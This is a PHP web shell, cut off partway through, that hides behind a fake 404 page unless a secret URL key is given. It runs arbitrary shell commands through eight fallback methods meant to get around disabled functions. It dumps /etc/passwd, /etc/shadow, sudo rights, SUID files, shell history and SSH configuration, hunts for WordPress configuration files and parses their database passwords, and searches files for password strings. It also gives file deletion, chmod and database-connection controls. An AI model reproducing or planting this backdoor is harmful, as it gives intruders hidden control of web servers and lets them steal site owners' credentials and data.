<?php
const AL_SHELL_KEY = 'al';
if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
    if (isset($_GET['al']) && $_GET['al'] === 'here') {
        exit('welcome');
    }
    http_response_code(404);
    exit('404 Not Found');
}
if (isset($_GET['action']) && $_GET['action'] === 'perform_search') {
    header('Content-Type: text/html; charset=utf-8');
    $searchTerm = $_POST['search_term'] ?? '';
    $searchType = $_POST['search_type'] ?? 'filename';
    $searchFromRoot = isset($_POST['search_root']);
    $searchDir = $_POST['d'] ?? getcwd();
    if (empty($searchTerm)) {
        echo '<pre>Please enter a search term.</pre>';
        exit;
    }
    if ($searchFromRoot) {
        chdir('/');
    } else {
        chdir($searchDir);
    }
    $results = '';
    if ($searchType === 'filename') {
        $command = "find . -iname " . escapeshellarg("*$searchTerm*") . " 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files or directories found matching '" . htmlspecialchars($searchTerm) . "'";
        }
    } elseif ($searchType === 'content') {
        $command = "grep -Rin " . escapeshellarg($searchTerm) . " . 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files found containing the string '" . htmlspecialchars($searchTerm) . "'";
        }
    }
    echo "<pre>" . htmlspecialchars($results) . "</pre>";
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'get_server_info') {
    header('Content-Type: text/html; charset=utf-8');
    echo get_detailed_server_info();
    exit;
}
function scan_for_files($dir, $patterns, &$found_paths, &$results, $current_depth, $max_depth, $extractTitle) {
    if ($current_depth > $max_depth) return;
    if (!is_readable($dir)) return;
    foreach ($patterns as $pattern) {
        $files = glob($dir . '/' . $pattern, GLOB_NOSORT);
        if ($files) {
            foreach ($files as $file) {
                if (!is_file($file)) continue;
                $path = dirname($file);
                if (in_array($path, $found_paths)) continue;
                $found_paths[] = $path;
                $result = analyze_file_match($path, basename($file), $extractTitle);
                $results[] = $result;
            }
        }
    }
    if ($current_depth < $max_depth) {
        try {
            $subdirs = glob($dir . '/*', GLOB_ONLYDIR);
            if (!$subdirs) return;
            foreach ($subdirs as $subdir) {
                $basename = basename($subdir);
                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
                scan_for_files($subdir, $patterns, $found_paths, $results, $current_depth + 1, $max_depth, $extractTitle);
            }
        } catch (Exception $e) {
            return;
        }
    }
}
function scan_for_content($dir, $patterns, &$found_files, &$results, $current_depth, $max_depth, $showPreview, $max_file_size, $file_extensions) {
    if ($current_depth > $max_depth) return;
    if (!is_readable($dir)) return;
    try {
        $files = glob($dir . '/*');
        if (!$files) return;
        foreach ($files as $file) {
            if (is_dir($file)) {
                $basename = basename($file);
                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
                scan_for_content($file, $patterns, $found_files, $results, $current_depth + 1, $max_depth, $showPreview, $max_file_size, $file_extensions);
            } elseif (is_file($file)) {
                if (filesize($file) > $max_file_size) continue;
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (!in_array($ext, $file_extensions)) continue;
                if (in_array($file, $found_files)) continue;
                $found_files[] = $file;
                $content = @file_get_contents($file, false, null, 0, 50000); // Baca max 50KB
                if (!$content) continue;
                $matches = [];
                foreach ($patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $context = '';
                        if ($showPreview) {
                            $pos = stripos($content, $pattern);
                            $start = max(0, $pos - 100);
                            $len = min(200, strlen($content) - $start);
                            $context = substr($content, $start, $len);
                            $context = str_replace($pattern, "**{$pattern}**", $context);
                        }
                        $matches[] = ['pattern' => $pattern, 'context' => $context];
                    }
                }
                if (!empty($matches)) {
                    $results[] = [
                        'path' => $file,
                        'type' => 'Content Match',
                        'size' => format_bytes(filesize($file)),
                        'writable' => is_writable($file),
                        'matches' => $matches,
                        'preview' => $showPreview
                    ];
                }
            }
        }
    } catch (Exception $e) {
        return;
    }
}
function format_bytes($bytes) {
    if ($bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}
function get_dir_size($dir) {
    $size = 0;
    if (!is_dir($dir) || !is_readable($dir)) {
        return '0 B';
    }
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }
    } catch (Exception $e) {
        return '0 B';
    }
    return format_bytes($size);
}
function analyze_file_match($path, $marker, $extractTitle) {
    $result = [
        'path' => $path,
        'type' => 'Unknown',
        'marker' => $marker,
        'writable' => is_writable($path),
        'size' => get_dir_size($path),
        'has_title' => false,
        'title' => null
    ];
    if (file_exists($path . '/wp-config.php')) {
        $result['type'] = 'WordPress';
    } elseif (file_exists($path . '/configuration.php')) {
        $result['type'] = 'Joomla';
    } elseif (file_exists($path . '/app/Mage.php')) {
        $result['type'] = 'Magento';
    } elseif (file_exists($path . '/sites/default/settings.php')) {
        $result['type'] = 'Drupal';
    } elseif (glob($path . '/*.php')) {
        $result['type'] = 'PHP Site';
    } elseif (glob($path . '/*.html') || glob($path . '/*.htm')) {
        $result['type'] = 'Static HTML';
    }
    if ($extractTitle) {
        foreach (['index.php', 'index.html', 'index.htm'] as $index) {
            $index_file = $path . '/' . $index;
            if (file_exists($index_file)) {
                $title = extract_website_title($index_file);
                if ($title) {
                    $result['title'] = $title;
                    $result['has_title'] = true;
                }
                break;
            }
        }
    }
    return $result;
}
function extract_website_title($file_path) {
    $content = @file_get_contents($file_path, false, null, 0, 5000);
    if (!$content) return null;
    if (preg_match('/<title[^>]*>([^<]+)<\/title>/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    if (preg_match('/<meta[^>]*name=["\']title["\'][^>]*content=["\']([^"\']+)["\']/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    return null;
}
function find_wp_configs() {
    $configs = [];
    $found_paths = []; // Track found paths to avoid duplicates
    function get_parent_dir($path, $levels) {
        $parent = $path;
        for ($i = 0; $i < $levels; $i++) {
            $new_parent = dirname($parent);
            if ($new_parent === $parent || $new_parent === '/' || empty($new_parent)) {
                return false;
            }
            $parent = $new_parent;
        }
        return $parent;
    }
    $current_dir = getcwd();
    $traversal_paths = [$current_dir];
    for ($i = 1; $i <= 10; $i++) {
        $parent_dir = get_parent_dir($current_dir, $i);
        if ($parent_dir === false) break;
        $traversal_paths[] = $parent_dir;
        $wp_config_path = $parent_dir . DIRECTORY_SEPARATOR . 'wp-config.php';
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
        $common_subdirs = array('wordpress', 'wp', 'html', 'public_html', 'www', 'web', 'site');
        foreach ($common_subdirs as $subdir) {
            $subdir_path = $parent_dir . DIRECTORY_SEPARATOR . $subdir . DIRECTORY_SEPARATOR . 'wp-config.php';
            if (@file_exists($subdir_path) && !in_array($subdir_path, $found_paths)) {
                $content = @file_get_contents($subdir_path);
                if ($content && strpos($content, 'DB_NAME') !== false) {
                    $config = parse_wp_config($content, $subdir_path);
                    if ($config) {
                        $configs[] = $config;
                        $found_paths[] = $subdir_path;
                    }
                }
            }
        }
    }
    $common_locations = array(
        '/var/www/html/wp-config.php',
        '/var/www/wordpress/wp-config.php',
        '/var/www/wp-config.php',
        '/var/www/html/wordpress/wp-config.php',
        '/home/www/wp-config.php',
        '/home/wordpress/wp-config.php',
        '/usr/share/wordpress/wp-config.php',
        '/opt/wordpress/wp-config.php',
        '/srv/www/wp-config.php'
    );
    foreach ($common_locations as $wp_config_path) {
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
    }
    $searched_paths = array_unique(array_merge(
        array('/var/www', '/home', '/opt', '/usr/share', '/srv', '/data'),
        $traversal_paths
    ));
    foreach ($searched_paths as $base_path) {
        if (!@is_dir($base_path)) continue;
        try {
            $dir_iterator = new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS);
            $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
            $count = 0;
            foreach ($iterator as $file) {
                if ($count > 300) break;
                if ($iterator->getDepth() > 2) continue; // Limit depth
                if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                    $filepath = $file->getPathname();
                    if (in_array($filepath, $found_paths)) continue;
                    $content = @file_get_contents($filepath);
                    if ($content && strpos($content, 'DB_NAME') !== false) {
                        $config = parse_wp_config($content, $filepath);
                        if ($config) {
                            $configs[] = $config;
                            $found_paths[] = $filepath;
                        }
                    }
                }
                $count++;
            }
        } catch (Exception $e) {
            continue;
        }
    }
    return $configs;
}
function parse_wp_config($content, $filepath) {
    $config = [
        'filepath' => $filepath,
        'db_host' => 'localhost',
        'db_port' => 3306,
        'db_name' => '',
        'db_user' => '',
        'db_pass' => '',
        'table_prefix' => 'wp_'
    ];
    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_name'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_user'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_pass'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $host_port = $matches[1];
        if (strpos($host_port, ':') !== false) {
            list($config['db_host'], $config['db_port']) = explode(':', $host_port);
        } else {
            $config['db_host'] = $host_port;
        }
    }
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches)) {
        $config['table_prefix'] = $matches[1];
    }
    return $config;
}
if (isset($_POST['action']) && $_POST['action'] === 'navigate_to_dir' && !empty($_POST['target_dir'])) {
    $targetDir = $_POST['target_dir'];
    if (is_dir($targetDir)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($targetDir));
        exit;
    } else {
        $output = "Directory does not exist: " . htmlspecialchars($targetDir);
    }
}
header("X-Robots-Tag: noindex, nofollow", true);
header("Content-Type: text/html; charset=utf-8");
 $dir = $_GET['d'] ?? getcwd();
 $dir = rtrim($dir, '/\\');
 $output = '';
 $renameTarget = $_POST['rename_target'] ?? null;
 $server_info = php_uname('a');
 $software_info = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
 $php_version = phpversion();
 $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']);
 $default_dir = getcwd();
function generate_breadcrumbs($path) {
    global $default_dir;
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = '<a href="?masuk=' . AL_SHELL_KEY . '&d=/">Root</a> / ';
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a> / ';
    }
    $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($default_dir) . '" title="Return to default directory">[Default]</a>';
    return rtrim($breadcrumbs, ' / ');
}

// Multi-method shell execution function - bypass disable_functions
function execute_shell_command($cmd) {
    $cmd = trim($cmd);
    if (empty($cmd)) return "Error: Empty command";
    
    $output = "";
    $methods_tried = [];
    
    // Method 1: shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "shell_exec";
        $output = @shell_exec($cmd . " 2>&1");
        if ($output !== null && $output !== false) {
            return $output;
        }
    }
    
    // Method 2: exec
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "exec";
        $output_arr = [];
        @exec($cmd . " 2>&1", $output_arr, $return_code);
        if (!empty($output_arr)) {
            return implode("\n", $output_arr);
        }
    }
    
    // Method 3: system
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "system";
        ob_start();
        @system($cmd . " 2>&1", $return_code);
        $output = ob_get_clean();
        if (!empty($output)) {
            return $output;
        }
    }
    
    // Method 4: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "passthru";
        ob_start();
        @passthru($cmd . " 2>&1", $return_code);
        $output = ob_get_clean();
        if (!empty($output)) {
            return $output;
        }
    }
    
    // Method 5: proc_open (most reliable alternative)
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "proc_open";
        $descriptors = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $output = $stdout . ($stderr ? "\nSTDERR:\n" . $stderr : "");
            if (!empty($output)) {
                return $output;
            }
        }
    }
    
    // Method 6: popen
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "popen";
        $handle = @popen($cmd . " 2>&1", 'r');
        if ($handle) {
            $output = "";
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            if (!empty($output)) {
                return $output;
            }
        }
    }
    
    // Method 7: Backticks (if not disabled)
    if (!in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        try {
            $methods_tried[] = "backticks";
            $output = @eval("return `$cmd 2>&1`;");
            if (!empty($output)) {
                return $output;
            }
        } catch (Exception $e) {
            // Backticks failed
        }
    }
    
    // Method 8: pcntl_exec (CLI only, rarely available)
    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "pcntl_exec";
        $tmpfile = tempnam(sys_get_temp_dir(), 'sh');
        file_put_contents($tmpfile, "#!/bin/sh\n" . $cmd . " 2>&1");
        chmod($tmpfile, 0755);
        
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = @proc_open($tmpfile, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            @unlink($tmpfile);
            if (!empty($output)) {
                return $output;
            }
        }
        @unlink($tmpfile);
    }
    
    // If all methods failed
    $disabled_funcs = ini_get('disable_functions');
    return "Error: All shell execution methods failed or are disabled.\n\nMethods tried: " . implode(", ", $methods_tried) . "\nDisabled functions: " . ($disabled_funcs ? $disabled_funcs : "None listed in disable_functions") . "\n\nPossible solutions:\n1. Use PHP file functions for basic operations\n2. Try using SQL queries if database is available\n3. Look for other entry points (cron, scheduled tasks)\n4. Check for bypass techniques specific to this server\n5. Consider using alternative shells (Perl, Python, etc.)";
}

function get_detailed_server_info() {
    $info = "";
    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(execute_shell_command("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg | tail -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(execute_shell_command("sysctl -a 2>/dev/null | head -n 50")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(execute_shell_command("whoami && id")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(execute_shell_command("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/passwd")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/group")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(execute_shell_command("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(execute_shell_command("ip a")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(execute_shell_command("ss -tulpn")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(execute_shell_command("arp -a")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(execute_shell_command("route -n")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(execute_shell_command("ps aux")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(execute_shell_command("top -bn1")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(execute_shell_command("systemctl list-units -type=service -state=running -no-pager 2>/dev/null || echo 'systemctl not found.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(execute_shell_command("crontab -l 2>/dev/null || echo 'No crontab for this user.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /etc/cron* 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(execute_shell_command("df -h")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(execute_shell_command("mount")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -perm -4000 -type f 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -perm -2000 -type f 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file()) . "\n" . htmlspecialchars(execute_shell_command("php -i | grep 'Configuration File'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(execute_shell_command("python -version 2>&1 && python3 -version 2>&1 && perl -v | head -n 2 && ruby -v 2>&1 && gcc -version | head -n 1 && nginx -v 2>&1 && apache2 -v 2>&1 || httpd -v 2>&1")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /home/ 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(execute_shell_command("ls -la /etc/ssh/ 2>/dev/null && cat /etc/ssh/sshd_config 2>/dev/null")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -type f -name '*.conf' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(execute_shell_command("find / -type f -name '*.pwd' -o -name '*password*' 2>/dev/null | head -n 20")) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(execute_shell_command("cat ~/.bash_history 2>/dev/null && echo '--' && cat ~/.nano_history 2>/dev/null")) . "</pre></div>";
    return $info;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_target']);
    $permission = $_POST['chmod_perm'];
    $recursive = isset($_POST['chmod_recursive']) ? '-R' : '';
    if (is_dir($targetFile) && empty($recursive)) {
        $command = "chmod " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    } else {
        $command = "chmod " . $recursive . " " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    }
    execute_shell_command($command);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'zip_selected' && !empty($_POST['selected_files'])) {
    $zipName = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($dir . DIRECTORY_SEPARATOR . $zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($_POST['selected_files'] as $file) {
            $filePath = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($filePath)) {
                $zip->addFile($filePath, basename($filePath));
            } elseif (is_dir($filePath)) {
                $zip->addEmptyDir(basename($filePath));
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $fileInfo) {
                    if ($fileInfo->isDot()) continue;
                    $localPath = basename($filePath) . '/' . $iterator->getSubPathName();
                    if ($fileInfo->isDir()) {
                        $zip->addEmptyDir($localPath);
                    } else {
                        $zip->addFile($fileInfo->getRealPath(), $localPath);
                    }
                }
            }
        }
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'delete_selected' && !empty($_POST['selected_files'])) {
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        if (is_dir($targetPath)) {
            @rmdir_recursive($targetPath);
        } else {
            @unlink($targetPath);
        }
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POST['selected_files'])) {
    header('Content-Type: application/json');
    $permission = $_POST['chmod_perm'] ?? '644';
    $recursive = isset($_POST['chmod_recursive']) && $_POST['chmod_recursive'] === '1';
    
    $results = [
        'success' => true,
        'total' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        'processed' => [],
        'errors' => []
    ];
    
    // Function to recursively chmod
    function chmod_recursive($path, $permission, &$results) {
        global $dir;
        if (!file_exists($path)) {
            $results['errors'][] = 'Not found: ' . $path;
            $results['failed_count']++;
            return false;
        }
        
        $success = @chmod($path, octdec($permission));
        $parentDir = dirname($path);
        $results['processed'][] = [
            'path' => $path,
            'name' => basename($path),
            'dir' => $parentDir,
            'type' => is_dir($path) ? 'dir' : 'file',
            'success' => $success
        ];
        
        if ($success) {
            $results['success_count']++;
        } else {
            $results['errors'][] = 'Failed: ' . $path;
            $results['failed_count']++;
        }
        $results['total']++;
        
        // If directory and recursive, process children
        if ($success && is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
                    chmod_recursive($childPath, $permission, $results);
                }
            }
        }
        
        return $success;
    }
    
    // Process each selected file/folder
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        
        if ($recursive && is_dir($targetPath)) {
            // Recursive chmod for directory
            chmod_recursive($targetPath, $permission, $results);
        } else {
            // Single item chmod
            if (file_exists($targetPath)) {
                $success = @chmod($targetPath, octdec($permission));
                $parentDir = dirname($targetPath);
                $results['processed'][] = [
                    'path' => $targetPath,
                    'name' => basename($targetPath),
                    'dir' => $parentDir,
                    'type' => is_dir($targetPath) ? 'dir' : 'file',
                    'success' => $success
                ];
                if ($success) {
                    $results['success_count']++;
                } else {
                    $results['errors'][] = 'Failed: ' . $targetPath;
                    $results['failed_count']++;
                }
                $results['total']++;
            } else {
                $results['errors'][] = 'Not found: ' . $targetPath;
                $results['failed_count']++;
                $results['total']++;
            }
        }
    }
    
    echo json_encode($results);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
    $zip = new ZipArchive;
    if ($zip->open($targetFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
    $file = basename($_GET['file']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        $raw = @file_get_contents($filepath);
        header('Content-Type: application/json');
        if (mb_check_encoding($raw, 'UTF-8')) {
            echo json_encode(['content' => $raw]);
        } else {
            echo json_encode(['content' => '[File is binary or not UTF-8 compatible]']);
        }
    } else {
        http_response_code(404);
        echo json_encode(['content' => 'File not found.']);
    }
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'discover_websites') {
    header('Content-Type: application/json');
    $mode = $_GET['mode'] ?? 'standard';
    $searchType = $_GET['search_type'] ?? 'filename';
    $pattern = $_GET['pattern'] ?? '';
    $extractTitle = isset($_GET['extract_title']) && $_GET['extract_title'] === '1';
    $showPreview = isset($_GET['show_preview']) && $_GET['show_preview'] === '1';
    $depthMap = ['quick' => 2, 'standard' => 4, 'deep' => 6, 'brutal' => 10];
    $maxDepth = isset($depthMap[$mode]) ? $depthMap[$mode] : 4;
    $results = [];
    if ($searchType === 'filename') {
        $patterns = array_map('trim', explode(',', $pattern));
        if (empty($patterns[0])) $patterns = ['index.php', 'index.html'];
        $foundPaths = [];
        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', '/usr/share', getcwd()];
        foreach ($searchPaths as $basePath) {
            if (!is_dir($basePath) || !is_readable($basePath)) continue;
            scan_for_files($basePath, $patterns, $foundPaths, $results, 0, $maxDepth, $extractTitle);
        }
    } else {
        $patterns = array_map('trim', explode(',', $pattern));
        if (empty($patterns[0])) $patterns = ['DB_PASSWORD', 'password'];
        $foundFiles = [];
        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', getcwd()];
        $fileExtensions = ['php', 'env', 'json', 'yml', 'yaml', 'xml', 'conf', 'ini', 'txt'];
        $maxFileSize = 1024 * 1024; // 1MB
        foreach ($searchPaths as $basePath) {
            if (!is_dir($basePath) || !is_readable($basePath)) continue;
            scan_for_content($basePath, $patterns, $foundFiles, $results, 0, $maxDepth, $showPreview, $maxFileSize, $fileExtensions);
        }
    }
    echo json_encode($results);
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'explore_db') {
    header('Content-Type: application/json');
    $configs = find_wp_configs();
    echo json_encode($configs);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'connect_db') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        echo json_encode(['success' => true]);
    } catch (PDOException $e) {
